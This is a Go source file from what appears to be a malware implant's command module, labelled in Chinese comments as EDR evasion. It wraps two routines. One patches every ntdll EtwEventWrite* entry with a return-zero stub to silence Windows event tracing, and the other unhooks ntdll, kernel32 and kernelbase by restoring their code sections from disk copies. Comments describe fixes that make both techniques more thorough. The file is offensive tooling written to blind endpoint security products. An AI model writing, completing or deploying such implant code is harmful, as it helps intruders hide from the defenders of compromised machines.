//go:build windows

package commands

import (
	"fmt"
	"strings"

	"implant/core/evasion"
)

// ===== A1: EDR 规避 =====
//
// 这里只做命令外壳，真正的实现都在 core/evasion：
//   - ETW patch 覆盖 ntdll 全部 EtwEventWrite* 入口（早期版本只改 EtwEventWrite，
//     漏掉直接调 EtwEventWriteFull/String 的 provider）
//   - unhook 用磁盘副本 + 重定位重建可执行节，逐字节抹差异（早期版本只恢复固定名单
//     里导出函数的前 16 字节，而且把 RVA 当文件偏移用 —— 会往 .text 里写错字节）

// CmdEtwPatch ETW 补丁命令入口
func CmdEtwPatch() ([]byte, error) {
	rep, err := evasion.PatchETW()
	var b strings.Builder
	b.WriteString(fmt.Sprintf("[*] ETW 入口 %d 个：\n", len(rep.Targets)))
	for _, t := range rep.Targets {
		if t.Err != nil {
			b.WriteString(fmt.Sprintf("    ⚠️ %s: %v\n", t.Name, t.Err))
			continue
		}
		ok := evasion.VerifyPatch(t.Addr, []byte{0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3})
		mark := "✅"
		if !ok {
			mark = "⚠️ 写入未生效"
		}
		b.WriteString(fmt.Sprintf("    %s %s @ 0x%x\n", mark, t.Name, t.Addr))
	}
	if err != nil {
		return []byte(b.String() + "[!] " + err.Error()), err
	}
	b.WriteString(fmt.Sprintf("[+] ETW patched: %v", rep.Patched()))
	return []byte(b.String()), nil
}

// CmdUnhookNtdll unhook 命令入口（默认 ntdll/kernel32/kernelbase）
func CmdUnhookNtdll() ([]byte, error) {
	reps, err := evasion.UnhookAll()
	var b strings.Builder
	restored := 0
	for _, r := range reps {
		b.WriteString("    " + r.String() + "\n")
		restored += r.Restored
	}
	if err != nil {
		return []byte(b.String() + "[!] " + err.Error()), err
	}
	if restored == 0 {
		b.WriteString("[+] 没有发现内联 hook（比较了磁盘副本与内存，逐字节一致）")
	} else {
		b.WriteString(fmt.Sprintf("[+] unhook 完成：共恢复 %d 字节", restored))
	}
	return []byte(b.String()), nil
}
